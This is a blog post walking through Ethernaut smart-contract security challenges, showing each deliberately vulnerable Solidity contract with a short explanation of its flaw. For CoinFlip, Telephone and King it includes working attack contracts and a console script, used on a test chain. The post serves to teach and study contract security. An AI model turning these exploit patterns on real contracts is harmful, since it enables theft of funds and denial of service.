<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.1.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"2298233831.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="The Blog of Yu4n">
<meta property="og:url" content="http://2298233831.github.io/posts/index.html">
<meta property="og:site_name" content="The Blog of Yu4n">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="Yu4n">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://2298233831.github.io/posts/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>The Blog of Yu4n</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">The Blog of Yu4n</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-reverse">

    <a href="/categories/Reverse/" rel="section"><i class="fa fa-archive fa-fw"></i>Reverse</a>

  </li>
        <li class="menu-item menu-item-web3-security">

    <a href="/categories/Web3-Security/" rel="section"><i class="fa fa-shield-alt fa-fw"></i>Web3 Security</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://2298233831.github.io/2025/10/14/Ethernaut-Challenges/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Yu4n">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="The Blog of Yu4n">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/10/14/Ethernaut-Challenges/" class="post-title-link" itemprop="url">Ethernaut Challenges</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2025-10-14 23:45:28" itemprop="dateCreated datePublished" datetime="2025-10-14T23:45:28+08:00">2025-10-14</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-10-15 00:00:28" itemprop="dateModified" datetime="2025-10-15T00:00:28+08:00">2025-10-15</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Web3-Security/" itemprop="url" rel="index"><span itemprop="name">Web3 Security</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Ethernaut-Challenges"><a href="#Ethernaut-Challenges" class="headerlink" title="Ethernaut Challenges"></a>Ethernaut Challenges</h1><h3 id="Fallback"><a href="#Fallback" class="headerlink" title="Fallback"></a>Fallback</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Fallback &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public contributions;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        contributions[msg.sender] = 1000 * (1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        require(msg.sender == owner, &quot;caller is not the owner&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function contribute() public payable &#123;</span><br><span class="line">        require(msg.value &lt; 0.001 ether);</span><br><span class="line">        contributions[msg.sender] += msg.value;</span><br><span class="line">        if (contributions[msg.sender] &gt; contributions[owner]) &#123;</span><br><span class="line">            owner = msg.sender;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getContribution() public view returns (uint256) &#123;</span><br><span class="line">        return contributions[msg.sender];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() public onlyOwner &#123;</span><br><span class="line">        payable(owner).transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Here, we transfer money to it, trigger the receive of the target contract, set the owner to ourselves, and then call the withdraw function; here we can use its contribute function to transfer money directly. In solidity, the function used to transfer money is as follows:</p>
<table>
<thead>
<tr>
<th>method</th>
<th>example</th>
<th>Gas limitations</th>
<th>ret val</th>
<th>catch failure</th>
<th>recommend to use it ?</th>
</tr>
</thead>
<tbody><tr>
<td><code>.transfer(amount)</code></td>
<td><code>payableAddr.transfer(1 ether);</code></td>
<td>fixed 2300 gas</td>
<td>N&#x2F;A</td>
<td>auto <code>revert</code></td>
<td>❌</td>
</tr>
<tr>
<td><code>.send(amount)</code></td>
<td><code>bool ok = payableAddr.send(1 ether);</code></td>
<td>fixed 2300 gas</td>
<td><code>bool</code></td>
<td>need <code>require(ok)</code></td>
<td>❌</td>
</tr>
<tr>
<td><code>.call&#123;value: amount&#125;(&quot;&quot;)</code></td>
<td><code>(bool ok, ) = payableAddr.call&#123;value: 1 ether&#125;(&quot;&quot;); require(ok);</code></td>
<td>By default, all remaining gas can be transferred (can be specified manually)</td>
<td><code>(bool success, bytes data)</code></td>
<td>need check <code>success</code></td>
<td>✅</td>
</tr>
</tbody></table>
<h3 id="Fal1out"><a href="#Fal1out" class="headerlink" title="Fal1out"></a>Fal1out</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts-06/math/SafeMath.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Fallout &#123;</span><br><span class="line">    using SafeMath for uint256;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; uint256) allocations;</span><br><span class="line">    address payable public owner;</span><br><span class="line"></span><br><span class="line">    /* constructor */</span><br><span class="line">    function Fal1out() public payable &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        allocations[owner] = msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        require(msg.sender == owner, &quot;caller is not the owner&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function allocate() public payable &#123;</span><br><span class="line">        allocations[msg.sender] = allocations[msg.sender].add(msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function sendAllocation(address payable allocator) public &#123;</span><br><span class="line">        require(allocations[allocator] &gt; 0);</span><br><span class="line">        allocator.transfer(allocations[allocator]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function collectAllocations() public onlyOwner &#123;</span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function allocatorBalance(address allocator) public view returns (uint256) &#123;</span><br><span class="line">        return allocations[allocator];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The constructor name is wrong, causing it to be treated as a normal function by the compiler. The owner can be set to yourself by calling it directly.</p>
<h3 id="CoinFlip"><a href="#CoinFlip" class="headerlink" title="CoinFlip"></a>CoinFlip</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line">    uint256 public consecutiveWins;</span><br><span class="line">    uint256 lastHash;</span><br><span class="line">    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        consecutiveWins = 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flip(bool _guess) public returns (bool) &#123;</span><br><span class="line">        uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line"></span><br><span class="line">        if (lastHash == blockValue) &#123;</span><br><span class="line">            revert();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        lastHash = blockValue;</span><br><span class="line">        uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">        bool side = coinFlip == 1 ? true : false;</span><br><span class="line"></span><br><span class="line">        if (side == _guess) &#123;</span><br><span class="line">            consecutiveWins++;</span><br><span class="line">            return true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            consecutiveWins = 0;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>This is because block.number is actually predictable. </p>
<p>The attack script is as follows:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">abstract contract CoinFlip &#123;</span><br><span class="line">  function flip(bool _guess) virtual public returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    CoinFlip coinFlip = CoinFlip(0x63AF8FDEeb040B20dcdA1D5B8C8564Ad1112f88a);</span><br><span class="line">    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">    function exploit() public returns(bool) &#123;</span><br><span class="line">        uint256 blockValue = uint256(blockhash(block.number-1));</span><br><span class="line">        uint256 flip = blockValue / FACTOR;</span><br><span class="line">        bool side = flip == 1 ? true : false;</span><br><span class="line">        return coinFlip.flip(side);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Then deploy the contract to the test chain.</p>
<p>Then call it from the console.</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">exploitSimple</span>(<span class="params">times</span>) &#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; times; i++) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> tx = <span class="keyword">await</span> attackContract.<span class="title function_">exploit</span>(&#123; <span class="attr">gasLimit</span>: <span class="number">300000</span> &#125;);</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Call <span class="subst">$&#123;i+<span class="number">1</span>&#125;</span> sent:`</span>, tx.<span class="property">hash</span>);</span><br><span class="line">      <span class="keyword">await</span> tx.<span class="title function_">wait</span>();</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Call <span class="subst">$&#123;i+<span class="number">1</span>&#125;</span> confirmed`</span>);</span><br><span class="line">      <span class="comment">// Wait 1.5 seconds for a new block to be generated to prevent blockhash duplication</span></span><br><span class="line">      <span class="keyword">await</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">r</span> =&gt;</span> <span class="built_in">setTimeout</span>(r, <span class="number">1500</span>));</span><br><span class="line">    &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`Call <span class="subst">$&#123;i+<span class="number">1</span>&#125;</span> failed:`</span>, e);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">exploitSimple</span>(<span class="number">10</span>);</span><br></pre></td></tr></table></figure>

<h3 id="Telephone"><a href="#Telephone" class="headerlink" title="Telephone"></a>Telephone</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Telephone &#123;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function changeOwner(address _owner) public &#123;</span><br><span class="line">        if (tx.origin != msg.sender) &#123;</span><br><span class="line">            owner = _owner;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>It should be noted here that the caller of the intermediate process will be ignored, so this vulnerability can be used for indirect attack.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">abstract contract Telephone&#123;</span><br><span class="line">    function changeOwner(address _owner) virtual public;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack&#123;</span><br><span class="line">    //0xf30928a61F2cd6D39A1C9577c70e1C44395Bcb0c</span><br><span class="line">    Telephone telephone = Telephone(0xf30928a61F2cd6D39A1C9577c70e1C44395Bcb0c);</span><br><span class="line"></span><br><span class="line">    function exploit() public &#123;</span><br><span class="line">        telephone.changeOwner(0xEOA_ADDR);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h3><p>uint integer overflow vulnerability, will basically no longer exist after 0.8</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line">    mapping(address =&gt; uint256) balances;</span><br><span class="line">    uint256 public totalSupply;</span><br><span class="line"></span><br><span class="line">    constructor(uint256 _initialSupply) public &#123;</span><br><span class="line">        balances[msg.sender] = totalSupply = _initialSupply;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address _to, uint256 _value) public returns (bool) &#123;</span><br><span class="line">        require(balances[msg.sender] - _value &gt;= 0);</span><br><span class="line">        balances[msg.sender] -= _value;</span><br><span class="line">        balances[_to] += _value;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address _owner) public view returns (uint256 balance) &#123;</span><br><span class="line">        return balances[_owner];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Delegation"><a href="#Delegation" class="headerlink" title="Delegation"></a>Delegation</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Delegate &#123;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    constructor(address _owner) &#123;</span><br><span class="line">        owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pwn() public &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Delegation &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    Delegate delegate;</span><br><span class="line"></span><br><span class="line">    constructor(address _delegateAddress) &#123;</span><br><span class="line">        delegate = Delegate(_delegateAddress);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback() external &#123;</span><br><span class="line">        (bool result,) = address(delegate).delegatecall(msg.data);</span><br><span class="line">        if (result) &#123;</span><br><span class="line">            this;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The delegate call vulnerability here is msg.data. You can change it to a function signature or function selector.</p>
<p>Then call the pwn function to change owner.</p>
<h3 id="Force"><a href="#Force" class="headerlink" title="Force"></a>Force</h3><p>How to transfer funds when the contract does not have receive and fallback? Use the selfdestruct function</p>
<h3 id="Vault"><a href="#Vault" class="headerlink" title="Vault"></a>Vault</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Vault &#123;</span><br><span class="line">    bool public locked;</span><br><span class="line">    bytes32 private password;</span><br><span class="line"></span><br><span class="line">    constructor(bytes32 _password) &#123;</span><br><span class="line">        locked = true;</span><br><span class="line">        password = _password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function unlock(bytes32 _password) public &#123;</span><br><span class="line">        if (password == _password) &#123;</span><br><span class="line">            locked = false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>These variables are publicly available on-chain. Private variables can be accessed by getStorageAt(slot) on-chain. To protect data, encryption or off-chain storage is required.</p>
<p><strong>On-chain &#x3D;&#x3D; public</strong></p>
<h3 id="King"><a href="#King" class="headerlink" title="King"></a>King</h3><p>destination</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract King &#123;</span><br><span class="line">    address king;</span><br><span class="line">    uint256 public prize;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    constructor() payable &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        king = msg.sender;</span><br><span class="line">        prize = msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        require(msg.value &gt;= prize || msg.sender == owner);</span><br><span class="line">        payable(king).transfer(msg.value);</span><br><span class="line">        king = msg.sender;</span><br><span class="line">        prize = msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _king() public view returns (address) &#123;</span><br><span class="line">        return king;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Here, we want to refuse subsequent transactions after obtaining the owner. The attack contract is as follows：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface IKing &#123;</span><br><span class="line">    function _king() external view returns (address);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract KingAttack &#123;</span><br><span class="line">    address payable public king;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        king = payable(0xC81297Dc635a59D16e60a518c7F27f56B0def02a);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    function exploit() external payable &#123;</span><br><span class="line">        (bool ok, ) = king.call&#123;value: msg.value&#125;(&quot;&quot;);</span><br><span class="line">        require(ok, &quot;bid failed&quot;);</span><br><span class="line">        require(IKing(king)._king() == address(this), &quot;not king&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        revert(&quot;I refuse to step down&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Reentrancy"><a href="#Reentrancy" class="headerlink" title="Reentrancy"></a>Reentrancy</h3><p>This issue primarily arises when balances are not checked and updated beforehand during transactions&#x2F;transactions.</p>
<p>The call function transfers control to the target contract. If the target contract then calls withdraw one or more times within its receive or fallback function after accepting the transfer, a reentrancy attack can occur.</p>
<p>We can <strong>check and update the balance</strong> beforehand by adding state variables to the target address, as detailed previously.</p>
